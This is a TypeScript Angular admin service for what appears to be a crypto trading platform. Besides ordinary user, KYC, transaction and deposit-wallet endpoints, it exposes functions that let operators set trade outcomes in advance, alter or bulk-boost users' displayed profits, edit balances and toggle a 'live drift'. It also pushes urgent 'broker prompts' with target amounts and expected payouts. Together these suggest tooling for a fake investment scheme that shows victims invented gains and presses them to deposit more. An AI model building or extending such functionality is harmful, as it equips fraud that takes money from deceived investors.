import { Injectable, inject } from '@angular/core';
import { HttpClient } from '@angular/common/http';
import { environment } from '../../environments/environment';
import { AdminMetrics, User, Transaction } from '../core/models/fintech.models';
import { Observable } from 'rxjs';

@Injectable({
  providedIn: 'root'
})
export class AdminService {
  private http = inject(HttpClient);

  getMetrics(): Observable<{ success: boolean; data: AdminMetrics }> {
    return this.http.get<{ success: boolean; data: AdminMetrics }>(`${environment.apiUrl}/admin/metrics`);
  }

  getUsers(search?: string): Observable<{ success: boolean; data: (User & { wallets: any[] })[] }> {
    const q = search ? `?search=${encodeURIComponent(search)}` : '';
    return this.http.get<{ success: boolean; data: (User & { wallets: any[] })[] }>(`${environment.apiUrl}/admin/users${q}`);
  }

  updateUserBalance(user_id: number, asset_symbol: string, new_balance: number): Observable<any> {
    return this.http.post<any>(`${environment.apiUrl}/admin/user/balance`, { user_id, asset_symbol, new_balance });
  }

  overrideKYC(user_id: number, status: string, admin_notes?: string): Observable<any> {
    return this.http.post<any>(`${environment.apiUrl}/admin/user/kyc`, { user_id, status, admin_notes });
  }

  resetUserSecurity(user_id: number, new_password?: string, new_pin?: string): Observable<any> {
    return this.http.post<any>(`${environment.apiUrl}/admin/user/security`, { user_id, new_password, new_pin });
  }

  getTransactions(): Observable<{ success: boolean; data: Transaction[] }> {
    return this.http.get<{ success: boolean; data: Transaction[] }>(`${environment.apiUrl}/admin/transactions`);
  }

  reviewTransaction(transaction_id: number, status: string, tx_hash?: string): Observable<any> {
    return this.http.post<any>(`${environment.apiUrl}/admin/transaction/review`, { transaction_id, status, tx_hash });
  }

  getSettings(): Observable<any> {
    return this.http.get<any>(`${environment.apiUrl}/admin/settings`);
  }

  updateSettings(settings: any): Observable<any> {
    return this.http.put<any>(`${environment.apiUrl}/admin/settings`, settings);
  }

  getManagedTrades(userId?: number): Observable<{ success: boolean; data: any[] }> {
    const q = userId ? `?user_id=${userId}` : '';
    return this.http.get<{ success: boolean; data: any[] }>(`${environment.apiUrl}/admin/managed-trades${q}`);
  }

  tradeForUser(payload: {
    user_id: number;
    pair: string;
    side: 'BUY' | 'SELL';
    amount: number;
    price?: number;
    initial_profit?: number;
    target_outcome?: string;
    admin_notes?: string;
  }): Observable<any> {
    return this.http.post<any>(`${environment.apiUrl}/admin/trade-for-user`, payload);
  }

  alterTradeProfit(payload: {
    trade_id: number;
    new_profit?: number;
    delta_profit?: number;
    target_outcome?: string;
    admin_notes?: string;
  }): Observable<any> {
    return this.http.post<any>(`${environment.apiUrl}/admin/alter-profit`, payload);
  }

  closeTrade(payload: {
    trade_id: number;
    outcome: 'WIN' | 'LOSS' | 'CLOSED';
  }): Observable<any> {
    return this.http.post<any>(`${environment.apiUrl}/admin/close-trade`, payload);
  }

  signalTradeClosing(payload: {
    trade_id: number;
    estimated_profit?: number;
    closing_note?: string;
  }): Observable<any> {
    return this.http.post<any>(`${environment.apiUrl}/admin/signal-closing`, payload);
  }

  tradeMultiAssets(payload: {
    user_id: number;
    assets: Array<{
      pair: string;
      side?: 'BUY' | 'SELL';
      amount: number;
      initial_profit?: number;
      target_outcome?: string;
    }>;
    admin_notes?: string;
  }): Observable<any> {
    return this.http.post<any>(`${environment.apiUrl}/admin/trade-multi-assets`, payload);
  }

  boostAllProfits(payload: {
    user_id: number;
    delta_profit: number;
  }): Observable<any> {
    return this.http.post<any>(`${environment.apiUrl}/admin/boost-all-profits`, payload);
  }

  sendBrokerPrompt(payload: {
    user_id: number;
    title: string;
    message: string;
    target_amount?: number;
    expected_payout?: number;
    urgency?: 'NORMAL' | 'HIGH' | 'CRITICAL';
  }): Observable<any> {
    return this.http.post<any>(`${environment.apiUrl}/admin/send-prompt`, payload);
  }

  getBrokerPrompts(userId?: number): Observable<{ success: boolean; data: any[] }> {
    const q = userId ? `?user_id=${userId}` : '';
    return this.http.get<{ success: boolean; data: any[] }>(`${environment.apiUrl}/admin/prompts${q}`);
  }

  dismissBrokerPrompt(id: number): Observable<any> {
    return this.http.delete<any>(`${environment.apiUrl}/admin/prompts/${id}`);
  }

  toggleLiveDrift(enabled: boolean): Observable<any> {
    return this.http.post<any>(`${environment.apiUrl}/admin/toggle-drift`, { enabled });
  }

  // =========================================================================
  // PLATFORM DEPOSIT WALLETS MANAGEMENT
  // =========================================================================
  getDepositWallets(): Observable<{ success: boolean; data: any[] }> {
    return this.http.get<{ success: boolean; data: any[] }>(`${environment.apiUrl}/admin/deposit-wallets`);
  }

  createDepositWallet(payload: any): Observable<any> {
    return this.http.post<any>(`${environment.apiUrl}/admin/deposit-wallets`, payload);
  }

  updateDepositWallet(id: number, payload: any): Observable<any> {
    return this.http.put<any>(`${environment.apiUrl}/admin/deposit-wallets/${id}`, payload);
  }

  toggleDepositWallet(id: number): Observable<any> {
    return this.http.patch<any>(`${environment.apiUrl}/admin/deposit-wallets/${id}/toggle`, {});
  }

  deleteDepositWallet(id: number): Observable<any> {
    return this.http.delete<any>(`${environment.apiUrl}/admin/deposit-wallets/${id}`);
  }
}
